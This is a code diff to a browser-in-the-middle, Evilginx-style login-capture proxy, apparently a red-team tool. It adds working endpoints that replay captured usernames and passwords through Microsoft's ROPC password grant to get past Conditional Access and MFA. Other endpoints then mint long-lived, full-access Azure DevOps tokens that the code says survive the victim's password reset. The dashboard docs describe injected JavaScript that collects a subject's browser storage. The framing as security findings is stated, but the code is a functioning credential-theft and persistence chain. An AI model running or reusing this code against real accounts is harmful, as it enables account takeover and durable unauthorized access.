@@ -43,7 +43,7 @@ from backend.routes import capture as capture_routes
 credentials_store = JsonStore("credentials")
 cookies_store = JsonStore("cookies")
 
-app = FastAPI(title="MITM Proxy Debug", version="1.24.3")
+app = FastAPI(title="BITM Proxy Debug", version="1.27.0")
 
 app.add_middleware(APIKeyMiddleware)
 app.include_router(browser_routes.router, prefix="/api/browser", tags=["browser"])
@@ -1254,6 +1254,23 @@ async def internal_captured_header(request: Request):
     return {"ok": True}
 
 
+@app.get("/api/rag/burp-extension/download")
+async def download_burp_extension():
+    """Download burp-extension/RagScanBridge.py — used by the Settings ->
+    RAG Scan Stack -> Burp Suite "Download extension" button so the operator
+    doesn't need to find the file on disk to load it into Burp's Extender."""
+    from fastapi import HTTPException
+    from fastapi.responses import Response
+    from pathlib import Path
+    ext_path = Path(__file__).resolve().parents[1] / "burp-extension" / "RagScanBridge.py"
+    if not ext_path.exists():
+        raise HTTPException(status_code=404, detail="RagScanBridge.py not found")
+    return Response(content=ext_path.read_bytes(),
+                     media_type="text/x-python",
+                     headers={"Content-Disposition":
+                              'attachment; filename="RagScanBridge.py"'})
+
+
 @app.get("/api/config")
 async def api_get_config():
     return get_config()
@@ -1298,6 +1315,252 @@ async def api_test_graph(body: dict):
             }
     except Exception as e:
         return {"error": str(e), "url": url}
+
+
+@app.post("/api/test-ropc")
+async def api_test_ropc(body: dict):
+    """ROPC (Resource Owner Password Credentials, RFC 6749 §4.3) grant —
+    POST username + password straight to the tenant's /token endpoint,
+    bypassing the interactive authorization endpoint (and any CA policy
+    that only evaluates that leg) entirely. Body:
+    {username, password, tenant_id?, client_id?, scope?}.
+    tenant_id defaults to "organizations", NOT "common"/"consumers" —
+    confirmed live: Microsoft rejects the password grant over those two
+    outright with AADSTS9001023, before it even looks at the credentials.
+
+    The AADSTS error code on failure is itself the finding, not just
+    "it didn't work" — e.g. AADSTS50076 means CA/MFA actually blocked the
+    legacy grant (policy working as intended); a 200 with an access_token
+    on an account that requires MFA for interactive sign-in means ROPC
+    is an uncovered bypass path, the same class of CA-policy gap this
+    tool's Path A/Path B features already demonstrate.
+
+    Enabled by default. Turn off via Configuration → enable_token_testing
+    (same gate as Test Graph — this also creates Azure AD sign-in log
+    entries, distinctly flagged as a legacy/non-interactive grant).
+    """
+    from backend.shared import get_config_value as _gcv
+    if not _gcv("enable_token_testing", True):
+        return {"error": "Token testing disabled (enable_token_testing=false). "
+                "This creates Azure AD sign-in log entries. Enable in Configuration."}
+    username = (body.get("username") or "").strip()
+    password = body.get("password") or ""
+    if not username or not password:
+        return {"error": "username and password required"}
+    # NOT "common"/"consumers" — confirmed live against the real endpoint:
+    # Microsoft rejects the password grant there outright with
+    # AADSTS9001023 ("grant type not supported over /common or /consumers"),
+    # before it ever checks the credentials. "organizations" (or a specific
+    # tenant GUID/domain) is required for ROPC to actually evaluate the
+    # account and CA policy.
+    tenant = (body.get("tenant_id") or "organizations").strip()
+    # Microsoft Authentication Broker — a well-known public client already
+    # used elsewhere in this repo (tools/phantom_join.py), pre-consented
+    # for first-party scenarios so ROPC doesn't need its own app registration.
+    client_id = (body.get("client_id") or "29d9ed98-a469-4536-ade2-f981bc1d605e").strip()
+    scope = (body.get("scope") or "https://graph.microsoft.com/.default openid profile offline_access").strip()
+    return await _ropc_grant(username, password, tenant, client_id, scope)
+
+
+async def _ropc_grant(username: str, password: str, tenant: str,
+                      client_id: str, scope: str) -> dict:
+    """Shared ROPC (grant_type=password) call used by /api/test-ropc and
+    /api/create-ado-pat. Returns the same structured shape both consumers
+    expect: on success {ok:True, access_token, ...}; on a blocked grant
+    {ok:False, aadsts_code, error, error_description} so callers can surface
+    the AADSTS code as the finding rather than a generic failure."""
+    import re
+    import httpx
+    url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
+    data = {"grant_type": "password", "client_id": client_id,
+            "username": username, "password": password, "scope": scope}
+    try:
+        async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
+            resp = await client.post(url, data=data,
+                                      headers={"Content-Type": "application/x-www-form-urlencoded"})
+            try:
+                resp_body = resp.json()
+            except Exception:
+                resp_body = {"raw": resp.text[:2000]}
+    except Exception as e:
+        return {"error": str(e), "url": url}
+
+    if resp.status_code == 200 and resp_body.get("access_token"):
+        append_log("info", "auth_proxy",
+                   f"ROPC_SUCCESS user={username} tenant={tenant} client_id={client_id}")
+        return {"ok": True, "status_code": resp.status_code,
+                "access_token": resp_body.get("access_token"),
+                "token_type": resp_body.get("token_type"),
+                "expires_in": resp_body.get("expires_in"),
+                "scope": resp_body.get("scope")}
+
+    err_desc = resp_body.get("error_description", "") or str(resp_body.get("raw", ""))
+    m = re.search(r"AADSTS\d+", err_desc)
+    append_log("warn", "auth_proxy",
+               f"ROPC_BLOCKED user={username} tenant={tenant} "
+               f"error={resp_body.get('error')} {m.group(0) if m else ''}")
+    return {"ok": False, "status_code": resp.status_code,
+            "error": resp_body.get("error"),
+            "error_description": err_desc,
+            "aadsts_code": m.group(0) if m else ""}
+
+
+# Azure DevOps first-party resource (app) ID — the audience an AAD token
+# must carry to call dev.azure.com / vssps.dev.azure.com APIs.
+_ADO_RESOURCE_ID = "499b84ac-1321-427f-aa17-267ca6975798"
+# Azure CLI public client — broadly pre-consented and confirmed live to
+# mint an ADO-resource token via ROPC for a lab account (the Auth Broker
+# client used for Graph ROPC does not carry ADO delegated permission).
+_AZ_CLI_CLIENT_ID = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
+
+
+@app.post("/api/create-ado-pat")
+async def api_create_ado_pat(body: dict):
+    """Mint a long-lived Azure DevOps Personal Access Token from captured
+    creds. Body:
+    {username?, password?, tenant_id?, access_token?, client_id?,
+     organization?, display_name?, scope?, valid_days?, all_orgs?}.
+
+    Chain (all confirmed live against the real endpoints):
+      1. Obtain an AAD token for the ADO resource (499b84ac-…) — either the
+         caller-supplied `access_token`, or a ROPC grant of
+         username+password (client defaults to the Azure CLI public client,
+         which carries ADO delegated permission).
+      2. If no `organization` given, discover the account's orgs via the
+         vssps profile + accounts APIs (returns the full list; uses the
+         first).
+      3. POST the PAT Lifecycle API to create the token.
+
+    Why this is a finding, not a utility: a PAT is durable credential
+    material that outlives the victim's password reset and is frequently
+    outside the Conditional Access / MFA re-evaluation that gates
+    interactive sign-in — the same class of coverage gap as ROPC and the
+    Phantom Join chain. `scope: app_token` = full-access, `all_orgs: true`
+    = every org the identity can reach.
+
+    Gated by enable_token_testing (creates a real AAD sign-in log entry and
+    a real, listable PAT in the target org)."""
+    from backend.shared import get_config_value as _gcv
+    if not _gcv("enable_token_testing", True):
+        return {"error": "Token testing disabled (enable_token_testing=false). "
+                "This creates Azure AD sign-in log entries and a real PAT. "
+                "Enable in Configuration."}
+    import datetime
+    import httpx
+
+    # --- 1. acquire an ADO-scoped AAD token -------------------------------
+    token = (body.get("access_token") or "").strip()
+    token_source = "provided"
+    if not token:
+        username = (body.get("username") or "").strip()
+        password = body.get("password") or ""
+        if not username or not password:
+            return {"error": "username and password required (or supply access_token)"}
+        tenant = (body.get("tenant_id") or "organizations").strip()
+        client_id = (body.get("client_id") or _AZ_CLI_CLIENT_ID).strip()
+        ropc = await _ropc_grant(username, password, tenant, client_id,
+                                 f"{_ADO_RESOURCE_ID}/.default")
+        if not ropc.get("ok"):
+            # Surface the ROPC failure verbatim (incl. aadsts_code) so the UI
+            # renders it as the finding, exactly like the ROPC panel does.
+            ropc["stage"] = "ropc"
+            return ropc
+        token = ropc.get("access_token") or ""
+        token_source = "ropc"
+
+    headers = {"Authorization": f"Bearer {token}"}
+
+    # --- 2. resolve the target org ----------------------------------------
+    organization = (body.get("organization") or "").strip()
+    discovered_orgs: list[str] = []
+    if not organization:
+        try:
+            # 30s (not the 15s used for the fast Microsoft login endpoint):
+            # the vssps.* hosts intermittently take >15s on the TLS handshake
+            # from inside Docker Desktop's NAT — confirmed live, a 15s cap
+            # surfaced as a spurious "discovery failed" on an otherwise-good run.
+            async with httpx.AsyncClient(timeout=30.0, verify=False) as client:
+                pr = await client.get(
+                    "https://app.vssps.visualstudio.com/_apis/profile/profiles/me?api-version=7.1",
+                    headers=headers)
+                if pr.status_code != 200:
+                    return {"error": f"ADO profile lookup failed (HTTP {pr.status_code}) — "
+                            "the token may lack ADO access, or the account has no ADO profile.",
+                            "stage": "profile", "status_code": pr.status_code,
+                            "token_source": token_source}
+                member_id = pr.json().get("publicAlias") or pr.json().get("id")
+                ar = await client.get(
+                    f"https://app.vssps.visualstudio.com/_apis/accounts?memberId={member_id}&api-version=7.1",
+                    headers=headers)
+                if ar.status_code == 200:
+                    discovered_orgs = [a.get("accountName") for a in ar.json().get("value", []) if a.get("accountName")]
+        except Exception as e:
+            # The vssps endpoints occasionally throw a bare connect/read
+            # error (empty str) — include the exception type so a transient
+            # network blip is distinguishable from a real failure on retry.
+            append_log("warn", "auth_proxy",
+                       f"ADO_DISCOVERY_FAILED {type(e).__name__}: {e}")
+            return {"error": f"ADO org discovery failed ({type(e).__name__}: {e}) — "
+                    "often transient, retry; or supply `organization` explicitly.",
+                    "stage": "discovery", "token_source": token_source}
+        if not discovered_orgs:
+            return {"error": "No Azure DevOps organizations found for this account. "
+                    "Supply `organization` explicitly if you know one.",
+                    "stage": "discovery", "token_source": token_source}
+        organization = discovered_orgs[0]
+
+    # --- 3. create the PAT ------------------------------------------------
+    display_name = (body.get("display_name") or "bitm-proxy").strip()
+    pat_scope = (body.get("scope") or "app_token").strip()
+    all_orgs = bool(body.get("all_orgs"))
+    try:
+        valid_days = int(body.get("valid_days") or 90)
+    except (TypeError, ValueError):
+        valid_days = 90
+    valid_to = (datetime.datetime.now(datetime.timezone.utc)
+                + datetime.timedelta(days=valid_days)).strftime("%Y-%m-%dT%H:%M:%S.000Z")
+    pat_body = {"displayName": display_name, "scope": pat_scope,
+                "validTo": valid_to, "allOrgs": all_orgs}
+    url = f"https://vssps.dev.azure.com/{organization}/_apis/tokens/pats?api-version=7.1-preview.1"
+    try:
+        # 30s for the same vssps-handshake-latency reason as the discovery call.
+        async with httpx.AsyncClient(timeout=30.0, verify=False) as client:
+            resp = await client.post(url, headers={**headers, "Content-Type": "application/json"},
+                                      json=pat_body)
+            try:
+                resp_body = resp.json()
+            except Exception:
+                resp_body = {"raw": resp.text[:2000]}
+    except Exception as e:
+        return {"error": str(e), "stage": "create", "organization": organization,
+                "token_source": token_source}
+
+    pt = resp_body.get("patToken") if isinstance(resp_body, dict) else None
+    if resp.status_code < 300 and pt and pt.get("token"):
+        append_log("warn", "auth_proxy",
+                   f"ADO_PAT_CREATED org={organization} name={display_name} "
+                   f"scope={pat_scope} all_orgs={all_orgs} valid_days={valid_days} "
+                   f"authz_id={pt.get('authorizationId')}")
+        return {"ok": True, "status_code": resp.status_code,
+                "pat": pt.get("token"),
+                "organization": organization,
+                "organizations": discovered_orgs,
+                "display_name": pt.get("displayName"),
+                "scope": pt.get("scope"),
+                "valid_to": pt.get("validTo"),
+                "valid_from": pt.get("validFrom"),
+                "authorization_id": pt.get("authorizationId"),
+                "token_source": token_source}
+
+    # PAT API reports per-request failures in patTokenError, not always HTTP status.
+    pat_err = (resp_body.get("patTokenError") if isinstance(resp_body, dict) else None) or ""
+    append_log("warn", "auth_proxy",
+               f"ADO_PAT_FAILED org={organization} status={resp.status_code} err={pat_err}")
+    return {"ok": False, "status_code": resp.status_code, "stage": "create",
+            "organization": organization, "organizations": discovered_orgs,
+            "error": pat_err or (resp_body.get("message") if isinstance(resp_body, dict) else None)
+                     or f"PAT creation failed (HTTP {resp.status_code})",
+            "token_source": token_source}
 
 
 @app.get("/api/aaa/info")
@@ -1434,7 +1697,7 @@ DASHBOARD_HTML = r"""<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MITM Proxy — Debug</title>
+<title>BITM Proxy — Debug</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0a0a1a;color:#e2e8f0;font-family:'SF Mono','Consolas',monospace;font-size:14px}
@@ -1708,8 +1971,8 @@ body{background:#0a0a1a;color:#e2e8f0;font-family:'SF Mono','Consolas',monospace
   <span id="ws-badge" class="badge badge-dead">connecting</span>
   <span style="flex:1"></span>
   <div class="header-launch">
-    <button class="btn" onclick="launchMitmProxy()">Launch</button>
-    <button class="btn" style="border-color:#a855f7;background:#3b1f6e;color:#c4b5fd" onclick="launchMitmProxy(true)">Private</button>
+    <button class="btn" onclick="launchBitmProxy()">Launch</button>
+    <button class="btn" style="border-color:#a855f7;background:#3b1f6e;color:#c4b5fd" onclick="launchBitmProxy(true)">Private</button>
   </div>
   <div class="stats">
     <span class="stat">Tok:<b id="st-tok">0</b></span>
@@ -1769,7 +2032,7 @@ body{background:#0a0a1a;color:#e2e8f0;font-family:'SF Mono','Consolas',monospace
         </div>
         <div class="settings-pane" data-pane="fingerprint" style="display:none">
           <h2>Fingerprint</h2>
-          <p style="color:#94a3b8;font-size:13px;margin:0 0 12px 0">All UA / Sec-CH-UA-* / TLS-impersonation / device-probe / DRS settings in one place. See the Docs tab → <i>Device fingerprinting &amp; profiles</i> for the mechanism, and <code>AUTH_FLOWS.md</code> for the YAML side.</p>
+          <p style="color:#94a3b8;font-size:13px;margin:0 0 12px 0">All UA / Sec-CH-UA-* / TLS-impersonation / device-probe / DRS settings in one place. See the Docs tab → <i>Device fingerprinting &amp; profiles</i> for the mechanism, and <code>docs/AUTH_FLOWS.md</code> for the YAML side.</p>
           <div id="fingerprint-cfg"></div>
           <div style="margin-top:12px"><button class="btn" onclick="saveConfig()">Apply</button></div>
         </div>
@@ -1890,7 +2153,7 @@ body{background:#0a0a1a;color:#e2e8f0;font-family:'SF Mono','Consolas',monospace
             <details style="margin:8px 0;border:1px solid #1e293b;border-radius:4px;padding:8px 12px;background:#0a0a14">
               <summary style="color:#94a3b8;font-size:13px;cursor:pointer;font-weight:600">Custom CA cert (replace the auto-generated one)</summary>
               <div style="padding:10px 0">
-                <p style="color:#94a3b8;font-size:12px;margin:0 0 8px 0">Upload your own CA cert + private key (PEM format) to replace the auto-generated MITM CA. Useful when you have an org-installed root that subjects already trust, or when you want a CA chain you control. Validates that the key matches the cert and that <code>BasicConstraints CA:TRUE</code> is set.</p>
+                <p style="color:#94a3b8;font-size:12px;margin:0 0 8px 0">Upload your own CA cert + private key (PEM format) to replace the auto-generated BITM CA. Useful when you have an org-installed root that subjects already trust, or when you want a CA chain you control. Validates that the key matches the cert and that <code>BasicConstraints CA:TRUE</code> is set.</p>
                 <div id="ca-current" style="margin-bottom:10px;font-size:12px"></div>
                 <div style="display:grid;grid-template-columns:auto 1fr;gap:8px;align-items:center;font-size:13px">
                   <label style="color:#94a3b8">CA cert (.crt / .pem)</label>
@@ -1929,7 +2192,7 @@ requests.get("https://example.com",
     verify=False)
                 </pre>
                 <div style="color:#7dd3fc;font-weight:600;margin-bottom:4px">3. For HTTPS injection: install the CA cert</div>
-                <div>The proxy generates a CA cert for MITM. Install it as a trusted root:</div>
+                <div>The proxy generates a CA cert for BITM. Install it as a trusted root:</div>
                 <pre style="background:#0a0a14;padding:6px;border-radius:4px;color:#cbd5e1;margin:4px 0" id="auth-proxy-ca-path">Start the proxy to see the CA cert path</pre>
                 <div style="color:#f87171;margin-top:4px">Without the CA cert, HTTPS sites will show certificate warnings. Use <code>verify=False</code> or <code>-k</code> to bypass.</div>
               </div>
@@ -1976,7 +2239,7 @@ requests.get("https://example.com",
         </div>
         <div class="settings-pane" data-pane="diagnostics" style="display:none">
           <h2>Diagnostics</h2>
-          <p style="color:#94a3b8;font-size:13px;margin-bottom:10px">Runs read-only checks across the container to show what's actually happening. Use this when a proxy isn't showing logs, a tab looks empty, or something's "bypassing" the MITM. Re-run anytime.</p>
+          <p style="color:#94a3b8;font-size:13px;margin-bottom:10px">Runs read-only checks across the container to show what's actually happening. Use this when a proxy isn't showing logs, a tab looks empty, or something's "bypassing" the BITM. Re-run anytime.</p>
           <div style="display:flex;gap:8px;align-items:center;margin-bottom:14px">
             <button class="btn" onclick="runDiagnostics()">Run checks</button>
             <span id="diag-summary" style="font-size:13px;color:#78859b"></span>
@@ -1993,7 +2256,7 @@ requests.get("https://example.com",
   </div>
 
   <div class="data-panel" id="panel-docs" style="display:none;overflow-y:auto;padding:20px 32px;max-width:900px">
-    <h1 style="color:#7dd3fc;margin-bottom:16px">MITM Proxy — Docs</h1>
+    <h1 style="color:#7dd3fc;margin-bottom:16px">BITM Proxy — Docs</h1>
     <div id="docs-content"></div>
   </div>
 
@@ -3423,7 +3686,7 @@ const IDX_DEFAULT_IGNORE=new Set([
   'priority',
 ]);
 
-const IDX_CUSTOM_STORAGE_KEY='mitm.idx.customIgnore';
+const IDX_CUSTOM_STORAGE_KEY='bitm.idx.customIgnore';
 function _idxLoadCustomIgnore(){
   try{const v=JSON.parse(localStorage.getItem(IDX_CUSTOM_STORAGE_KEY)||'[]');return new Set(v.map(s=>String(s).toLowerCase()))}
   catch(_){return new Set()}
@@ -4579,6 +4842,12 @@ function renderIntegrations(){
     ${row('rag_api_key', c.rag_api_key, 'Sent as <code>x-api-key</code> header')}
     ${row('rag_engagement_id', c.rag_engagement_id, 'Optional UUID of the RAG engagement to attach findings to')}
 
+    <h4 style="margin-top:14px;color:#cbd5e1;font-size:13px">Burp Suite</h4>
+    <div style="color:#94a3b8;font-size:13px;margin-bottom:8px"><code>burp-extension/RagScanBridge.py</code> is a Burp Extender (Jython) extension that syncs findings with the built-in RAG API on :8000 — no external RAG Scan Stack needed. Burp Suite -&gt; Extender -&gt; Add -&gt; Extension Type: Python, then select the downloaded file.</div>
+    <div style="margin:8px 0">
+      <a class="btn" style="padding:4px 12px;font-size:13px;text-decoration:none;display:inline-block" href="/api/rag/burp-extension/download" download="RagScanBridge.py">Download Burp extension</a>
+    </div>
+
     <h3>Ollama Analysis</h3>
     <div style="color:#94a3b8;font-size:13px;margin-bottom:8px">When enabled, the "Analyze (Ollama)" button sends a compact flow summary plus the system prompt below to the configured Ollama server.</div>
     ${row('ollama_enabled', c.ollama_enabled)}
@@ -4722,7 +4991,23 @@ function renderDocs(){
     #docs-content th,#docs-content td{border:1px solid #333;padding:4px 10px;text-align:left;color:#cbd5e1}
     #docs-content th{background:#0d0d20;color:#94a3b8}
     #docs-content .hint{background:#0a0a18;border-left:3px solid #3b82f6;padding:8px 14px;margin:8px 0;color:#94a3b8;font-size:13px}
+    #docs-content .attack-card{border:1px solid #222;border-radius:6px;padding:12px 16px;margin:12px 0;background:#0d1117}
+    #docs-content .attack-card h3{margin-top:0}
+    #docs-content .attack-card h3 a{color:#7dd3fc;text-decoration:none;border-bottom:1px dashed #33506b}
+    #docs-content .attack-card h3 a:hover{color:#a5d6ff;border-bottom-color:#7dd3fc}
+    #docs-content .attack-card h3 .portal-arrow{font-size:12px;color:#6e7681;font-weight:normal;margin-left:6px}
+    #docs-content .attack-goal{color:#78859b;font-size:12px;margin:0 0 8px 0;font-style:italic}
+    .docs-subtab-bar{display:flex;gap:6px;margin-bottom:16px;border-bottom:1px solid #222;padding-bottom:10px}
+    .docs-subtab-btn{background:#12141f;border:1px solid #2a2f3d;color:#94a3b8;padding:6px 14px;border-radius:4px;font-size:13px;cursor:pointer}
+    .docs-subtab-btn.active{background:#0ea5e91a;border-color:#0ea5e9;color:#7dd3fc}
   </style>
+
+  <div class="docs-subtab-bar">
+    <button class="docs-subtab-btn active" data-docs-pane="reference" onclick="switchDocsPane('reference')">Reference</button>
+    <button class="docs-subtab-btn" data-docs-pane="attacks" onclick="switchDocsPane('attacks')">Test Attacks</button>
+  </div>
+
+  <div id="docs-pane-reference">
 
   <p style="color:#94a3b8">Remote browser login capture + auth proxy + flow tracer. Everything runs in this one container.</p>
 
@@ -4732,7 +5017,7 @@ function renderDocs(){
     <tr><td><code>8091</code></td><td>Main app — browser session UI</td><td><a href="http://${host}:8091/" target="_blank" style="color:#7dd3fc">http://${host}:8091/</a></td></tr>
     <tr><td><code>8092</code></td><td>Debug dashboard (you are here)</td><td>—</td></tr>
     <tr><td><code>8000</code></td><td>RAG API (Burp extension target)</td><td><a href="http://${host}:8000/health" target="_blank" style="color:#7dd3fc">http://${host}:8000/health</a></td></tr>
-    <tr><td><code>8085</code></td><td>Reverse proxy (transparent MITM, Evilginx-style)</td><td><a href="http://${host}:8085/" target="_blank" style="color:#7dd3fc">http://${host}:8085/</a></td></tr>
+    <tr><td><code>8085</code></td><td>Reverse proxy (transparent BITM, Evilginx-style)</td><td><a href="http://${host}:8085/" target="_blank" style="color:#7dd3fc">http://${host}:8085/</a></td></tr>
     <tr><td><code>3100-3199</code></td><td>Published range for auth proxy (default <b>3128</b>) — any port in this range is reachable on your host. <b>Click Start on the Proxy tab</b> to enable.</td><td>—</td></tr>
     <tr><td><code>3129</code></td><td>Built-in test proxy (default — any of 3100-3199 works)</td><td>—</td></tr>
   </table>
@@ -4746,7 +5031,7 @@ function renderDocs(){
     <li><b>Devices</b> — reusable device profiles (fingerprint + optional probed JS signals + optional creds). See <i>Device fingerprinting &amp; profiles</i> below.</li>
     <li><b>Keep-Alive</b> — token-validity monitoring log.</li>
     <li><b>Proxy</b> — start/stop the auth proxy and test proxy, configure upstream.</li>
-    <li><b>Proxy Traffic</b> — live traffic flowing through the auth proxy (<code>INJECT</code>, <code>MITM_INJECT</code>, <code>TUNNEL</code>, etc.).</li>
+    <li><b>Proxy Traffic</b> — live traffic flowing through the auth proxy (<code>INJECT</code>, <code>BITM_INJECT</code>, <code>TUNNEL</code>, etc.).</li>
     <li><b>Flow Trace</b> — timeline of every HTTP exchange in a browser session, with taint highlighting and auth-milestone banner pills (LOGIN → AUTH CODE → TOKENS → SESSION → PRT). See <i>Auth-flow milestones</i> below.</li>
     <li><b>Index</b> — aggregated cross-row index of headers, cookies, bearer tokens, and <b>Decoded JWTs</b> (claims surfaced inline — no signature verification). Click an item to highlight it across the Flow Trace.</li>
   </ul>
@@ -4780,7 +5065,7 @@ function renderDocs(){
     <tr><td><span class="flow-ms-badge mdm_enroll" style="padding:1px 6px">MDM-ENROLL</span></td><td>Intune MDM enrollment exchange — device gets its MDM cert and initial policy set. Followed by periodic MDM-CHECKIN.</td><td>Host in <code>globals.mdm_milestones.hosts</code> AND path matches an <code>enroll_url_patterns</code> entry (default: <code>/EnrollmentServer/Enrollment</code>, <code>/EnrollmentServer/Policy</code>).</td></tr>
     <tr><td><span class="flow-ms-badge mdm_checkin" style="padding:1px 6px">MDM-CHECKIN</span></td><td>Intune SyncML / OMA-DM check-in — the device reports posture and Intune evaluates compliance policies. The compliance verdict (<code>isCompliant: true/false</code>) propagates into AAD device records out-of-band and is <b>not</b> directly visible in this body — look at the next id_token's <code>deviceid</code> claim for what AAD ended up believing.</td><td>Host in <code>globals.mdm_milestones.hosts</code> AND path matches a <code>checkin_url_patterns</code> entry (default: <code>/dmserver</code>, <code>/manage.svc</code>, <code>/SyncML</code>).</td></tr>
   </table>
-  <p>All recognition rules live in <code>config/sites.yaml</code> under the <code>auth_milestones:</code> block and deep-merge with <code>$DATA_DIR/sites.yaml</code>. Adding a custom on-prem ADFS or Keycloak is a YAML edit, not a code change — the regex bundles compile once on YAML hot-reload (mtime-checked, ~1 s) and cache against the merged-rules dict identity. Full guide: <code>AUTH_FLOWS.md</code> in the repo.</p>
+  <p>All recognition rules live in <code>config/sites.yaml</code> under the <code>auth_milestones:</code> block and deep-merge with <code>$DATA_DIR/sites.yaml</code>. Adding a custom on-prem ADFS or Keycloak is a YAML edit, not a code change — the regex bundles compile once on YAML hot-reload (mtime-checked, ~1 s) and cache against the merged-rules dict identity. Full guide: <code>docs/AUTH_FLOWS.md</code> in the repo.</p>
   <h3>Reclassify milestones</h3>
   <p>The Flow Trace toolbar's <b>Reclassify milestones</b> button forces a fresh <code>classify()</code> pass over every row of the selected session. Useful after editing <code>config/sites.yaml</code> or to backfill rows captured before the classifier shipped.</p>
   <p>The result lands as a banner directly above the timeline:</p>
@@ -4790,10 +5075,10 @@ function renderDocs(){
     <li><b>YAML status:</b> green (<code>YAML loaded (N idp_hosts, M session cookies)</code>) or red (<code>YAML problem — idp_hosts=0, login_re=NO, token_re=NO</code>).</li>
     <li>Expandable <b>untagged token-path rows</b> dump up to 3 samples with their request/response body previews so you can read why on the spot.</li>
   </ul>
-  <p>Same line is also <code>print()</code>'d to stdout with a <code>[FLOW]</code> prefix — visible via <code>journalctl -u mitm-proxy -f</code>, <code>docker logs -f</code>, or the <code>run-local.sh</code> console.</p>
+  <p>Same line is also <code>print()</code>'d to stdout with a <code>[FLOW]</code> prefix — visible via <code>journalctl -u bitm-proxy -f</code>, <code>docker logs -f</code>, or the <code>run-local.sh</code> console.</p>
 
   <h2>Device fingerprinting &amp; profiles</h2>
-  <p>The MITM proxy on <code>:3128</code> passively captures the connecting browser's device fingerprint on every request — User-Agent, the full Sec-CH-UA-* client-hint set (<code>sec-ch-ua</code>, <code>sec-ch-ua-mobile</code>, <code>sec-ch-ua-platform</code>, <code>-platform-version</code>, <code>-arch</code>, <code>-bitness</code>, <code>-model</code>, <code>-full-version-list</code>, etc.), and Accept-Language. It's stored per-host under <code>_captured_sessions[hostname]['fingerprint']</code> in <code>backend/auth_proxy.py</code> and surfaces in the <b>Captures</b> dropdown with a family tag (<code>chromium-msedge</code>, <code>webkit</code>, <code>firefox</code>) and a hint count.</p>
+  <p>The BITM proxy on <code>:3128</code> passively captures the connecting browser's device fingerprint on every request — User-Agent, the full Sec-CH-UA-* client-hint set (<code>sec-ch-ua</code>, <code>sec-ch-ua-mobile</code>, <code>sec-ch-ua-platform</code>, <code>-platform-version</code>, <code>-arch</code>, <code>-bitness</code>, <code>-model</code>, <code>-full-version-list</code>, etc.), and Accept-Language. It's stored per-host under <code>_captured_sessions[hostname]['fingerprint']</code> in <code>backend/auth_proxy.py</code> and surfaces in the <b>Captures</b> dropdown with a family tag (<code>chromium-msedge</code>, <code>webkit</code>, <code>firefox</code>) and a hint count.</p>
 
   <h3>Two ways to use the fingerprint</h3>
   <table>
@@ -4822,7 +5107,7 @@ function renderDocs(){
     <li><b>Register from capture…</b> (Devices tab toolbar) — pick a host you've already browsed through <code>:3128</code>. Modes:
       <ul>
         <li><b>Passive</b> — snapshot of <code>_captured_sessions[host]</code> right now. No prompt to the subject.</li>
-        <li><b>Active JS probe</b> — also stamps a one-shot <code>_pending_probes[host]</code> entry. The next GET that flows through <code>:3128</code> to that host gets a <b>synthetic 200 OK</b> from the proxy that runs JS to read tz/screen/viewport/languages/platform, POSTs the result to a sentinel path on the same host (<code>/__mitm_probe_callback</code> — consumed in-proxy, never reaches upstream), and meta-refreshes to the original URL. Single-fire, 30-min TTL.</li>
+        <li><b>Active JS probe</b> — also stamps a one-shot <code>_pending_probes[host]</code> entry. The next GET that flows through <code>:3128</code> to that host gets a <b>synthetic 200 OK</b> from the proxy that runs JS to read tz/screen/viewport/languages/platform, POSTs the result to a sentinel path on the same host (<code>/__bitm_probe_callback</code> — consumed in-proxy, never reaches upstream), and meta-refreshes to the original URL. Single-fire, 30-min TTL.</li>
         <li><b>Probe + cred snapshot</b> — same as Active probe, plus the probe page also serializes <code>localStorage</code> / <code>sessionStorage</code> into the POST body.</li>
       </ul>
     </li>
@@ -4845,7 +5130,7 @@ function renderDocs(){
 DEVICE_PROBE_PENDING / DEVICE_PROBE_PAGE_SERVED / DEVICE_PROBE_APPLIED / DEVICE_PROBE_REJECT
 DEVICE_APPLY_CONTEXT / DEVICE_APPLY_POST_LAUNCH / DEVICE_LAUNCH_REQUEST
 DEVICE_UPDATE / DEVICE_DELETE</pre>
-  <p>Filter All Logs to Service <code>devices</code> in the dropdown, or grep <code>journalctl -u mitm-proxy -g "DEVICE_"</code>. Apply-context and apply-post-launch entries also bind <code>session_id</code> so per-session log files surface them.</p>
+  <p>Filter All Logs to Service <code>devices</code> in the dropdown, or grep <code>journalctl -u bitm-proxy -g "DEVICE_"</code>. Apply-context and apply-post-launch entries also bind <code>session_id</code> so per-session log files surface them.</p>
 
   <h3>WS commands &amp; REST</h3>
   <p>WS (over <code>/ws/control</code>): <code>list_devices</code>, <code>get_device</code>, <code>register_device_from_capture</code>, <code>register_device_from_session</code>, <code>register_device_manual</code>, <code>update_device</code>, <code>delete_device</code>, <code>launch_with_device</code>.</p>
@@ -4858,7 +5143,7 @@ DEVICE_UPDATE / DEVICE_DELETE</pre>
     <li>Open the <b>RAG Scan Bridge</b> tab in Burp.</li>
     <li>Set <b>RAG API URL</b> to <code>http://${host}:8000</code> (default <code>https://localhost:8000</code> won't work — no TLS here).</li>
     <li>Set <b>API Key</b> to anything non-empty (no auth enforced on the RAG API).</li>
-    <li>Click <b>Test Connection</b>. You should see "Connected — mitm-proxy".</li>
+    <li>Click <b>Test Connection</b>. You should see "Connected — bitm-proxy".</li>
     <li>Click <b>Import Filtered Findings</b> (or <b>Import All</b>) to pull flows as Burp scan issues.</li>
   </ol>
   <p>You can also push to an <i>external</i> RAG Scan Stack from the Flow Trace tab: click <b>Send to RAG</b>. That uses <code>rag_api_url</code> from the Configuration panel.</p>
@@ -4888,7 +5173,7 @@ DEVICE_UPDATE / DEVICE_DELETE</pre>
   <p>Meaning of each flag:</p>
   <table>
     <tr><th>Flag</th><th>Direction</th><th>Purpose</th></tr>
-    <tr><td><code>-L 3128:localhost:3128</code></td><td>remote → laptop</td><td>Python MITM auth proxy reachable at <code>localhost:3128</code> on your laptop</td></tr>
+    <tr><td><code>-L 3128:localhost:3128</code></td><td>remote → laptop</td><td>Python BITM auth proxy reachable at <code>localhost:3128</code> on your laptop</td></tr>
     <tr><td><code>-L 3129:localhost:3129</code></td><td>remote → laptop</td><td>Go test proxy</td></tr>
